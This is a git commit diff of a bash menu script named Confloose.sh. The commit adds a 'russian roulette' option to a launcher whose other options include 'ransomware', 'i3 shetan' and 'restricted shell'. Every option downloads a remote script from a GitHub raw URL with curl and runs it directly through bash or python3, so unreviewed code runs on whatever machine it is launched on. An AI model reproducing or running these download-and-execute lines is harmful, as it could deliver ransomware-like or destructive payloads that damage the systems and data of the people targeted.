31f22f0231274353d0f9e5bc867b310ce299abb6
Nekro <70316327+NeKroFR@users.noreply.github.com>
2024-02-20 15:07:56 +0100

    Update Confloose.sh

--- Confloose.sh
+++ Confloose.sh
@@ -9,8 +9,8 @@ function gui() {
     echo -e "\033[0;31m[0]\033[0m ransomware"
     echo -e "\033[0;31m[1]\033[0m i3 shetan"
     echo -e "\033[0;31m[2]\033[0m restricted shell"
-    echo -e "\033[0;31m[3]\033[0m exit"
-
+    echo -e "\033[0;31m[3]\033[0m russian roulette"
+    echo -e "\033[0;31m[4]\033[0m exit"
     echo "-------"
     read -p $'\033[1;35mHow do you want to confloose? \033[0m' choice
     confloose "$choice"
@@ -22,11 +22,14 @@ function confloose() {
         bash <(curl "https://raw.githubusercontent.com/NeKroFR/Confl00se/main/scripts/ransom.sh")
     elif [ "$1" == "1" ] || [ "$1" == "shell" ] || [ "$1" == "-s" ]; then
          # i3 shetan
-         bash <(curl "https://raw.githubusercontent.com/NeKroFR/Confl00se/main/scripts/onlymouse.sh")
+         bash <(curl "https://raw.githubusercontent.com/NeKroFR/Confl00se/main/scripts/i3shetan.sh")
     elif [ "$1" == "2" ] || [ "$1" == "shell" ] || [ "$1" == "-s" ]; then
         # restricted_shell
         python3 <(curl "https://raw.githubusercontent.com/NeKroFR/Confl00se/main/scripts/restricted_shell.py")
-    elif [ "$1" == "3" ]; then
+    elif [ "$1" == "3" ] || [ "$1" == "shell" ] || [ "$1" == "-s" ]; then
+        # russian roulette
+        bash <(curl "https://raw.githubusercontent.com/NeKroFR/Confl00se/main/scripts/roulette.sh")
+    elif [ "$1" == "4" ]; then
         exit
     else
         echo -e "\033[0;31mInvalid arg\033[0m"
